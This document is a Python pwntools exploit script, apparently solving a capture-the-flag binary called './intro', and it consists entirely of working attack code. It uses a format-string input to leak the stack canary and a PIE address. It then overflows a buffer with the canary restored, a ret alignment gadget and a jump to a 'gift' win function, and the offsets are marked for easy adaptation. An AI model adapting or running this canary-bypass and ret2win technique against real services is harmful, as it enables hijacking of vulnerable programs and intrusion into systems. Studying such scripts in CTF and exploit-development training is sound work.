from pwn import *

exe = "./intro"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(exe)

# CHANGE ME
OFFSET_TO_CANARY = 104
OFFSET_TO_RBP = 8
CANARY_IDX = 33
PIE_IDX = 35
PIE_SUBTRACT = 0x10c9
RET_GADGET = 0x1016 
WIN_SYM = "gift"
# END

io = start()

# ---- Leak ----
fmt = f"%{CANARY_IDX}$p.%{PIE_IDX}$p".encode()
io.sendlineafter(b"Type in your name below:\n", fmt)
# io.sendlineafter(b"Type in your name below:\n", b"%33$p.%35$p")
io.recvuntil(b"to meet you ")
canary_s, pie_s = io.recvline().strip().split(b".")

canary = int(canary_s, 16)
pie_leak = int(pie_s, 16)

log.info(f"canary   = {canary:#x}")
log.info(f"pie leak = {pie_leak:#x}")

# ---- PIE base ----
elf.address = pie_leak - PIE_SUBTRACT
log.info(f"pie base = {elf.address:#x}")

win_addr = elf.symbols[WIN_SYM]
log.info(f"{WIN_SYM}() = {win_addr:#x}")

# ---- ret gadget (alignment) ----
ret = elf.address + RET_GADGET  # adjust if different
log.info(f"ret gadget = {ret:#x}")

# ---- Payload ----
payload = flat([
    b"A" * OFFSET_TO_CANARY,
    canary,
    b"B" * OFFSET_TO_RBP,
    ret,
    win_addr
])

io.sendlineafter(b"Give your message of the day?\n", payload)
io.interactive()
